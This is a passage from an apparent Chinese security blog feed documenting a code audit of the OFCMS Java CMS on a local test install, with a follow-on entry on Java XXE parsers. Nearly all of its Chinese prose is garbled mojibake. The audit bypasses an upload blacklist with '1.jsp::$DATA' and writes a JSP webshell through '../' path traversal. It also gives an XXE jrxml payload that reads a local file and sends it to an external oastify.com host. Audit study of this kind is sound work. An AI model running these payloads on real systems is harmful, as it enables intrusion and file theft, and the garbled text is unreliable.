2.å¦‚æœä¸æ˜¯ï¼Œåˆ™å°†å…¶åŒ…è£…æˆä¸€ä¸ªæ”¯æŒæ–‡ä»¶ä¸Šä¼ çš„è¯·æ±‚å¯¹è±¡ï¼Œå¹¶æŒ‡å®šä¸Šä¼ è·¯å¾„ï¼›<br>  3.æœ€åï¼Œä»è¯·æ±‚ä¸­è·å–å¹¶è¿”å›ä¸Šä¼ çš„æ–‡ä»¶åˆ—è¡¨ï¼ˆList<UploadFile>ï¼‰ã€‚</p><p>wrapMultipartRequestæ–¹æ³•ä¸­å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†isSafeFileæ–¹æ³•</p><p><img src="/img/ofcms/ofcms15.png"></p><p>isSafeFileæ–¹æ³•æ–¹æ³•ç”¨äºåˆ¤æ–­ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹æ˜¯å¦æ˜¯.jspæˆ–.jspxæ–‡ä»¶</p><p>å°†æ–‡ä»¶åç¼€é¦–å°¾å»ç©ºåŠè½¬æ¢æˆå°å†™</p><p><img src="/img/ofcms/ofcms14.png"></p><p>åŠ¨æ€è°ƒè¯•æ—¶ä¹Ÿå¯ä»¥çœ‹åˆ°ç»è¿‡äº†å¤æ‚çš„åˆ¤æ–­ï¼Œå¯ä»¥çœ‹åˆ°æœ‰Content-Typeå’Œåç¼€éªŒè¯</p><p>æ­¤å¤„æ˜¯é»‘åå•ç»•è¿‡</p><p><a href="https://blog.csdn.net/2301_81864699/article/details/143099369">æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ€»ç»“â€”â€”è¯¦ç»†ä¿å§†ç¯‡-CSDNåšå®¢</a></p><p>å°è¯•æˆªæ–­%00ï¼Œä¸åç¼€jspxç»•è¿‡ï¼Œèƒ½å¤ŸæˆåŠŸä¸Šä¼ ï¼Œä½†æ˜¯æ— æ³•è¯†åˆ«</p><p>å°è¯•å¤šç§åæ˜¯åˆ©ç”¨äº†1.jsp::$DATA(windowsç‰¹æ€§ï¼Œä¸Šä¼ è‡³windowsæœåŠ¡å™¨åä¸º1.jsp)æˆåŠŸä¸Šä¼ </p><p><img src="/img/ofcms/ofcms16.png"></p><p>æ³¨ï¼š</p><p>åŠ¨æ€è°ƒè¯•åå‘ç°<mark>ä¸Šä¼ åçš„å›¾ç‰‡ä¸åœ¨ç½‘ç«™è·¯å¾„ä¸‹</mark></p><p>åœ¨tomcat&#x2F;apache-tomcat-9.0.98&#x2F;webapps&#x2F;ofcms_admin_war&#x2F;upload&#x2F;imageè·¯å¾„ä¸‹</p><h4 id="åå°æ–‡ä»¶ä¸Šä¼ 02"><a href="#åå°æ–‡ä»¶ä¸Šä¼ 02" class="headerlink" title="åå°æ–‡ä»¶ä¸Šä¼ 02"></a>åå°æ–‡ä»¶ä¸Šä¼ 02</h4><p>æ„Ÿè§‰æ²¡æƒ³åˆ°æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¼šä»¥è¿™ç§å½¢å¼å‘ˆç°</p><p>å¦‚æœä¸çœ‹æ–‡ç« è‡ªå·±è‚¯å®šæ˜¯æƒ³ä¸åˆ°çš„</p><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;cms&#x2F;TemplateController.java</p><p>saveæ–¹æ³•</p><p><img src="/img/ofcms/ofcms17.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹æ–‡ä»¶ååŠæ–‡ä»¶å†…å®¹éƒ½æ²¡æœ‰é™åˆ¶ï¼Œè™½ç„¶æ­¤å¤„æ§åˆ¶çš„æ˜¯ç½‘é¡µæ¨¡æ¿ä¿®æ”¹åŠŸèƒ½ï¼Œä½†æ˜¯çœ‹ä»£ç æ˜¯å¯ä»¥é€šè¿‡æ•°æ®åŒ…ä¸Šä¼ æ–‡ä»¶çš„ï¼Œæ˜¯ä¸€ä¸ªå¯åˆ©ç”¨çš„æ¥å£</p><p>æŠ“å–è¯·æ±‚æ•°æ®åŒ…å¾€æœåŠ¡å™¨å†™å…¥webshellï¼Œåœ¨æ–‡ä»¶åä¸­æ’å…¥<code>../</code>è·¯å¾„è·³è½¬ç¬¦ï¼Œæ§åˆ¶åœ¨staticç›®å½•ä¸‹å†™å…¥æ¶æ„JSPæ–‡ä»¶</p><p>é€‰æ‹©ä¸€ä¸ªjspæ¶æ„æ–‡ä»¶å°†å†…å®¹urlç¼–ç åå†™å…¥æ•°æ®åŒ…file_contentä¸­</p><p>file_nameæ”¹ä¸º..&#x2F;..&#x2F;..&#x2F;static&#x2F;shell.jsp</p><p>(åŸindex.htmlåœ¨&#x2F;tomcat&#x2F;apache-tomcat-9.0.98&#x2F;webapps&#x2F;ofcms_admin_war&#x2F;WEB-INF&#x2F;page&#x2F;default&#x2F;ç›®å½•ä¸‹ï¼Œstaticä¸WEB-INFæ–‡ä»¶å¤¹åœ¨åŒä¸€çº§)</p><p><mark>ä¸ä¼šä¸Šä¼ åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼ï¼ï¼</mark></p><p><img src="/img/ofcms/ofcms18.png"></p><p>å¯ä»¥çœ‹åˆ°é¡ºåˆ©ä¸Šä¼ </p><p>D:&#x2F;tomcat&#x2F;apache-tomcat-9.0.98&#x2F;webapps&#x2F;ofcms_admin_war&#x2F;static</p><p><img src="/img/ofcms/ofcms19.png"></p><p>è®¿é—®ä¸€ä¸‹</p><p><img src="/img/ofcms/ofcms20.png"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯èƒ½å¤Ÿæ­£å¸¸è®¿é—®çš„ï¼Œå°±æ˜¯éœ€è¦æ”¹ä¸€ä¸‹ç¼–ç </p><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>åœ¨å¤–éƒ¨åº“ä¸­å¯ä»¥çœ‹åˆ°æ˜¯æœ‰è§£æxmlæ–‡æ¡£çš„ç›¸å…³èµ„æºåŒ…çš„</p><p><img src="/img/ofcms/ofcms21.png"></p><p>å°è¯•æœç´¢xmlå…³é”®å­—</p><p>åœ¨com.ofsoft.cms.admin.controller.ReprotActionç±»çš„expReportæ–¹æ³•ä¸­ï¼Œæ¥æ”¶ç”¨æˆ·è¾“å…¥çš„jå‚æ•°åï¼Œæ‹¼æ¥ç”Ÿæˆæ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œæ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥ç©¿è¶Šåˆ°å…¶å®ƒç›®å½•ï¼Œä½†æ˜¯é™åˆ¶äº†æ–‡ä»¶åç¼€ä¸ºjrxmlï¼Œæ¥ä¸‹æ¥ä¼šè°ƒç”¨<code>JasperCompileManager.compileReport()</code>æ–¹æ³•</p><p><code>.jrxml</code> æ˜¯JasperReports æŠ¥è¡¨æ¨¡æ¿æºæ–‡ä»¶çš„æ–‡ä»¶æ‰©å±•åï¼Œå®ƒæ˜¯JasperReports çš„ XML æ ¼å¼æŠ¥è¡¨æ¨¡æ¿</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">expReport</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> getResponse();<br>Map&lt;String, Object&gt; hm = getParamsMap();<br>    <br>    <span class="hljs-comment">//è·å–å‚æ•° jï¼Œå³æŠ¥è¡¨æ¨¡æ¿åï¼ˆä¸å«æ‰©å±•åï¼‰ï¼›</span><br>        <span class="hljs-comment">//æ‹¼æ¥æ¨¡æ¿çš„å®Œæ•´è·¯å¾„ï¼›</span><br>        <span class="hljs-comment">//ç”¨ PathKit.getWebRootPath() è·å– Web æ ¹ç›®å½•è·¯å¾„ï¼›</span><br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª File å¯¹è±¡æŒ‡å‘ .jrxml æ¨¡æ¿æ–‡ä»¶ã€‚</span><br><span class="hljs-type">String</span> <span class="hljs-variable">jrxmlFileName</span> <span class="hljs-operator">=</span> (String) hm.get(<span class="hljs-string">&quot;j&quot;</span>);<br>jrxmlFileName = <span class="hljs-string">&quot;/WEB-INF/jrxml/&quot;</span> + jrxmlFileName + <span class="hljs-string">&quot;.jrxml&quot;</span>;<br><span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(PathKit.getWebRootPath() + jrxmlFileName);<br>    <br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> (String) hm.get(<span class="hljs-string">&quot;reportName&quot;</span>);<br>log.info(<span class="hljs-string">&quot;æŠ¥è¡¨æ–‡ä»¶å[&#123;&#125;]&quot;</span>, file.getPath());<br> <span class="hljs-type">OutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource) SysBeans<br>.getBean(<span class="hljs-string">&quot;dataSourceProxy&quot;</span>);<br><span class="hljs-type">JasperPrint</span> <span class="hljs-variable">jprint</span> <span class="hljs-operator">=</span> (JasperPrint) JasperFillManager.fillReport(<br>JasperCompileManager<br>.compileReport(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)), hm,<br>dataSource.getConnection());<br><span class="hljs-type">JRXlsExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRXlsExporter</span>();<br>response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span><br>+ URLEncoder.encode(fileName, <span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">&quot;.xls&quot;</span>);<br>response.setContentType(<span class="hljs-string">&quot;application/xls&quot;</span>);<br>response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>JasperReportsUtils.render(exporter, jprint,<br>response.getOutputStream());<br>response.setStatus(HttpServletResponse.SC_OK);<br> out=response.getOutputStream();<br> out.flush();<br>         out.close();<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<span class="hljs-keyword">finally</span>&#123;<br><span class="hljs-keyword">try</span> &#123;<br>out.close();<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æä»£ç åæ‰¾åˆ°äº†ä¸€æ®µæ¯”è¾ƒå…³é”®çš„ä»£ç </p><p>å¡«å……å¹¶ç”ŸæˆæŠ¥è¡¨</p><p>å…ˆä½¿ç”¨ <code>JasperCompileManager</code> ç¼–è¯‘ <code>.jrxml</code> æ–‡ä»¶ï¼›</p><p>ç„¶åç”¨å‚æ•° <code>hm</code> å’Œæ•°æ®åº“è¿æ¥å¡«å……æŠ¥è¡¨å†…å®¹ï¼Œç”Ÿæˆ <code>JasperPrint</code> å¯¹è±¡ï¼ˆä»£è¡¨æŠ¥è¡¨æ•°æ®ç»“æ„ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JasperPrint</span> <span class="hljs-variable">jprint</span> <span class="hljs-operator">=</span> (JasperPrint) JasperFillManager.fillReport(<br>    JasperCompileManager.compileReport(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)),<br>    hm,<br>    dataSource.getConnection());<br></code></pre></td></tr></table></figure><p>æ­¤æ®µä»£ç å¯èƒ½å¯¹æ–‡ä»¶å†…å®¹æœ‰æ§åˆ¶</p><p>è·Ÿè¿›compileReportå‡½æ•°</p><p>compileReport-&gt;compile-&gt;JRXmlLoader.load-&gt;xmlLoader.loadXML-&gt;digester.parse(ååºåˆ—åŒ–)</p><p>compileæ–¹æ³•</p><p><img src="/img/ofcms/ofcms22.png"></p><p>xmlLoader.loadXML</p><p>æ­¤æ–¹æ³•ä¸»è¦æ˜¯å°† <code>.jrxml</code> æŠ¥è¡¨æ¨¡æ¿æ–‡ä»¶ä» InputStream ä¸­è¯»å–ï¼Œä½¿ç”¨ SAX è§£ææ–¹å¼è½¬æ¢ä¸º JasperDesign æŠ¥è¡¨è®¾è®¡å¯¹è±¡<img src="/img/ofcms/ofcms23.png"></p><p>å¯ä»¥çœ‹åˆ°ä»£ç ä¸­å¹¶æ²¡æœ‰ç¦ç”¨å¤–éƒ¨å®ä½“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä¸æ”¯æŒå¤–éƒ¨å®ä½“</span><br>xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="hljs-literal">false</span>);<br><span class="hljs-comment">// ä¸æ”¯æŒdtd</span><br>xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><p>å¼€å§‹æµ‹è¯•</p><p>åˆ©ç”¨å‰é¢å‘ç°çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸Šä¼ ä¸€ä¸ªjrxmlä¸ºåç¼€çš„æ–‡ä»¶</p><p>æ–‡ä»¶å†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://3qu6uz9jay9cbyrfh9d0wtxmndt4h25r.oastify.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span><br>%eval;<br>%exfil;<br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">abc</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://127.0.0.1:7777&quot;</span>&gt;</span>&amp;xxe; ]&gt;</span><br></code></pre></td></tr></table></figure><p>çœ‹åˆ°æˆåŠŸä¸Šä¼ </p><p><img src="/img/ofcms/ofcms24.png"></p><p>è®¿é—®url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/ofcms_admin_war/admin/reprot/expReport.html?j=../../static/1<br></code></pre></td></tr></table></figure><p><img src="/img/ofcms/ofcms25.png"></p><p>ä½†æ˜¯æ¢äº†å¾ˆå¤šdnså¹³å°éƒ½æ²¡æœ‰è®¿é—®è®°å½•ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><h4 id="å‚æ•°æœªè¿‡æ»¤-è¯¯æŠ¥"><a href="#å‚æ•°æœªè¿‡æ»¤-è¯¯æŠ¥" class="headerlink" title="å‚æ•°æœªè¿‡æ»¤(è¯¯æŠ¥)"></a>å‚æ•°æœªè¿‡æ»¤(è¯¯æŠ¥)</h4><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;cms&#x2F;ContentController.java</p><p>ç¬¬äºŒæ¡å…³äºsqlæ³¨å…¥æ¼æ´çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        List&lt;Record&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Record&gt;();<br>        Map&lt;String, Object&gt; params = getParamsMap();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//ä¿®æ”¹å†…å®¹</span><br>            <span class="hljs-type">Record</span> <span class="hljs-variable">record</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Record</span>();<br>            record.set(<span class="hljs-string">&quot;title_name&quot;</span>, params.get(<span class="hljs-string">&quot;title_name&quot;</span>));<br>            record.set(<span class="hljs-string">&quot;content_id&quot;</span>, params.get(<span class="hljs-string">&quot;content_id&quot;</span>));<br>            Db.update(<span class="hljs-string">&quot;of_cms_content&quot;</span>, <span class="hljs-string">&quot;content_id&quot;</span>,record);<br>            <span class="hljs-comment">//ç»„è£…å‚æ•°</span><br>            <span class="hljs-keyword">for</span> (String key : params.keySet()) &#123;<br>                list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Record</span>().set(<span class="hljs-string">&quot;name&quot;</span>,key).set(<span class="hljs-string">&quot;value&quot;</span>, params.get(key).toString()).set(<span class="hljs-string">&quot;content_id&quot;</span>, params.get(<span class="hljs-string">&quot;content_id&quot;</span>)));<br>            &#125;<br>            <span class="hljs-comment">//æ‰¹é‡ä¿®æ”¹</span><br>            Db.batchUpdate(<span class="hljs-string">&quot;of_cms_content_field&quot;</span>,<span class="hljs-string">&quot;content_id,name&quot;</span>,list, list.size());<br><br>            rendSuccessJson();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            rendFailedJson(ErrorCode.get(<span class="hljs-string">&quot;9999&quot;</span>));<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ‰«æå‘ˆç°å‡ºæ­¤ä»£ç æœ‰æ¼æ´çš„åŸå› æ˜¯å·¥å…·ä¸­ç¨‹åºè®¤å®šparamsä¸­å‚æ•°æœªè¿‡æ»¤ï¼Œä½†æ˜¯å®é™…é€šè¿‡æ­¤å‚æ•°æ— æ³•æ³¨å…¥æ¶æ„æ•°æ®å®Œæˆå­—ç¬¦ä¸²æ‹¼æ¥</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ol><li>javaä»£ç å®¡è®¡å·¥å…·åˆå§‹é…ç½®ä¸‹ä¸å¦‚phpå®Œå–„ï¼Œå¾ˆå¤šæ¼æ´éœ€è¦æ‰‹åŠ¨æŸ¥æ‰¾(å‡†å¤‡å¤šæ¢å‡ ä¸ªå·¥å…·è¯•è¯•)</li><li>è¦é»‘ç™½ç›’ç»“åˆå®¡è®¡ï¼Œåœ¨ç½‘ç«™å¯»æ‰¾åŠŸèƒ½ç‚¹å†å¯¹åº”æºç æµ‹è¯•</li><li>æ‰‹åŠ¨æœç´¢ç‰¹æ®Šå‡½æ•°ä¸å…³é”®å­—å¯¹æœç´¢ç»“æœåšç­›é€‰æ‰¾æ¼æ´</li></ol>]]></content>
    
    
    <categories>
      
      <category>Javaä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaä»£ç å®¡è®¡</tag>
      
      <tag>CMS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaä»£ç å®¡è®¡ä¸­çš„XXE</title>
    <link href="/2025/07/13/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84XXE/"/>
    <url>/2025/07/13/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84XXE/</url>
    
    <content type="html"><![CDATA[<h2 id="Javaä»£ç å®¡è®¡ä¸­çš„XXE"><a href="#Javaä»£ç å®¡è®¡ä¸­çš„XXE" class="headerlink" title="Javaä»£ç å®¡è®¡ä¸­çš„XXE"></a>Javaä»£ç å®¡è®¡ä¸­çš„XXE</h2><p>æ„Ÿè§‰ç¬¬ä¸€æ¬¡å­¦åˆ°xxeè¿™ä¸ªæ¼æ´æ—¶å­¦çš„ä¸æ˜¯å¾ˆå¥½ï¼Œç°åœ¨å†æ¥æ·±å…¥å­¦ä¹ ä¸€ä¸‹</p><p>å‚è€ƒï¼š<a href="https://drun1baby.top/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">Java OWASP ä¸­çš„ XXE ä»£ç å®¡è®¡ | Drunkbabyâ€™s Blog (drun1baby.top)</a></p><p>â€‹  <a href="https://blog.csdn.net/qq_48201589/article/details/136421867">ã€Javaä»£ç å®¡è®¡ã€‘XXE_java xxe-CSDNåšå®¢</a></p><p>â€‹<a href="https://www.freebuf.com/articles/web/318984.html">WEBå®‰å…¨&amp;JAVAä»£ç å®¡è®¡ï¼šXXEå¤–éƒ¨å®ä½“æ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>ä»£ç å®¡è®¡åŸºäºæ­¤é¡¹ç›®ï¼š<a href="https://github.com/JoyChou93/java-sec-code?tab=readme-ov-file">JoyChou93&#x2F;java-sec-code</a></p><h3 id="XMLæ–‡æ¡£çš„æ ¼å¼ä¸ç»“æ„"><a href="#XMLæ–‡æ¡£çš„æ ¼å¼ä¸ç»“æ„" class="headerlink" title="XMLæ–‡æ¡£çš„æ ¼å¼ä¸ç»“æ„"></a>XMLæ–‡æ¡£çš„æ ¼å¼ä¸ç»“æ„</h3><p><a href="https://www.freebuf.com/articles/web/318984.html">WEBå®‰å…¨&amp;JAVAä»£ç å®¡è®¡ï¼šXXEå¤–éƒ¨å®ä½“æ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>å…³äºDTDï¼š<a href="https://xz.aliyun.com/news/14107">JAVA XXE ä»åŸç†åˆ°åˆ©ç”¨-å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><h3 id="åˆ¤æ–­XXEæ¼æ´å­˜åœ¨"><a href="#åˆ¤æ–­XXEæ¼æ´å­˜åœ¨" class="headerlink" title="åˆ¤æ–­XXEæ¼æ´å­˜åœ¨"></a>åˆ¤æ–­XXEæ¼æ´å­˜åœ¨</h3><ol><li>è§‚å¯Ÿå‘é€æ•°æ®åŒ…ä¸­æ•°æ®æ˜¯å¦æ˜¯xmlæ ¼å¼</li><li>æœç´¢å¤„ç†XMLæ–‡æ¡£ç›¸å…³çš„ç±»ä¸æ¥å£</li><li>å¼€å§‹æµ‹è¯•ï¼Œå°è¯•æ˜¯å¦èƒ½é¡ºåˆ©è®¿é—®DNSå¹³å°ç•™ä¸‹è®°å½•</li></ol><h3 id="å®¡è®¡ä¸­å¸¸è§çš„ç±»-æ¥å£"><a href="#å®¡è®¡ä¸­å¸¸è§çš„ç±»-æ¥å£" class="headerlink" title="å®¡è®¡ä¸­å¸¸è§çš„ç±»&#x2F;æ¥å£"></a>å®¡è®¡ä¸­å¸¸è§çš„ç±»&#x2F;æ¥å£</h3><p>xmlæ–‡ä»¶çš„è§£æå¯ç”¨åˆ°çš„è§£æå™¨æœ‰å››ç§ï¼Œå¯¹åº”ä¸åŒçš„å†™æ³•ä»¥åŠè§£æåŒ…</p><p>è¯¦ç»†æ¯”è¾ƒï¼š<a href="https://blog.csdn.net/2501_90253336/article/details/145215020">Javaè¿›é˜¶(äº”åä¸€)XML å››ç§è§£æå™¨(dom,sax,jdom,dom4j)åŸç†åŠæ€§èƒ½æ¯”è¾ƒ java xmlè§£æå·¥å…·_java jdom-CSDNåšå®¢</a></p><h4 id="XMLReader-æ¥å£"><a href="#XMLReader-æ¥å£" class="headerlink" title="XMLReader(æ¥å£)"></a>XMLReader(æ¥å£)</h4><p>XMLReaderæ¥å£æ˜¯ä¸€ç§é€šè¿‡å›è°ƒè¯»å–XMLæ–‡æ¡£çš„æ¥å£ï¼Œå…¶å­˜åœ¨äºå…¬å…±åŒºåŸŸä¸­ã€‚XMLReaderæ¥å£æ˜¯XMLè§£æå™¨å®ç°SAX2é©±åŠ¨ç¨‹åºæ‰€å¿…éœ€çš„æ¥å£ï¼Œå…¶å…è®¸åº”ç”¨ç¨‹åºè®¾ç½®å’ŒæŸ¥è¯¢è§£æå™¨ä¸­çš„åŠŸèƒ½å’Œå±æ€§ã€æ³¨å†Œæ–‡æ¡£å¤„ç†çš„äº‹ä»¶å¤„ç†ç¨‹åºï¼Œä»¥åŠå¼€å§‹æ–‡æ¡£è§£æã€‚å½“XMLReaderä½¿ç”¨é»˜è®¤çš„è§£ææ–¹æ³•å¹¶ä¸”æœªå¯¹XMLè¿›è¡Œè¿‡æ»¤æ—¶ï¼Œä¼šå‡ºç°XXEæ¼æ´</p><h4 id="SAXBuilder"><a href="#SAXBuilder" class="headerlink" title="SAXBuilder"></a>SAXBuilder</h4><p>SAXBuilder æ˜¯ä¸€ä¸ª JDOM è§£æå™¨ï¼Œå…¶èƒ½å¤Ÿå°†è·¯å¾„ä¸­çš„ XML æ–‡ä»¶è§£æä¸º Document å¯¹è±¡ã€‚SAXBuilder ä½¿ç”¨ç¬¬ä¸‰æ–¹ SAX è§£æå™¨æ¥å¤„ç†è§£æä»»åŠ¡ï¼Œå¹¶ä½¿ç”¨SAXHandlerçš„å®ä¾‹ä¾¦å¬ SAX äº‹ä»¶ã€‚å½“SAXBuilderä½¿ç”¨é»˜è®¤çš„è§£ææ–¹æ³•å¹¶ä¸”æœªå¯¹XMLè¿›è¡Œè¿‡æ»¤æ—¶ï¼Œä¼šå‡ºç° XXE æ¼æ´</p><h4 id="SAXReader"><a href="#SAXReader" class="headerlink" title="SAXReader"></a>SAXReader</h4><p>DOM4Jæ˜¯dom4j.orgå‡ºå“çš„ä¸€ä¸ªå¼€æºXMLè§£æåŒ…ï¼Œä½¿ç”¨èµ·æ¥éå¸¸ç®€å•ï¼Œåªè¦äº†è§£åŸºæœ¬çš„XML-DOMæ¨¡å‹ï¼Œå°±èƒ½ä½¿ç”¨ã€‚DOM4Jè¯»&#x2F;å†™XMLæ–‡æ¡£ä¸»è¦ä¾èµ–äºorg.dom4j.ioåŒ…ï¼Œå®ƒæœ‰DOMReaderå’ŒSAXReaderä¸¤ç§æ–¹å¼ã€‚å› ä¸ºä½¿ç”¨äº†åŒä¸€ä¸ªæ¥å£ï¼Œæ‰€ä»¥è¿™ä¸¤ç§æ–¹å¼çš„è°ƒç”¨æ–¹æ³•æ˜¯å®Œå…¨ä¸€è‡´çš„ã€‚åŒæ ·çš„ï¼Œåœ¨ä½¿ç”¨é»˜è®¤è§£ææ–¹æ³•å¹¶ä¸”æœªå¯¹XMLè¿›è¡Œè¿‡æ»¤æ—¶ï¼Œå…¶ä¹Ÿä¼šå‡ºç°XXEæ¼æ´ã€‚</p><h4 id="SAXParserFactory"><a href="#SAXParserFactory" class="headerlink" title="SAXParserFactory"></a>SAXParserFactory</h4><p>SAXParserFactoryä½¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿé…ç½®å’Œè·å–åŸºäºSAXçš„è§£æå™¨ä»¥è§£æXMLæ–‡æ¡£ã€‚å…¶å—ä¿æŠ¤çš„æ„é€ æ–¹æ³•ï¼Œå¯ä»¥å¼ºåˆ¶ä½¿ç”¨newInstance()ã€‚è·Ÿä¸Šé¢ä»‹ç»çš„ä¸€æ 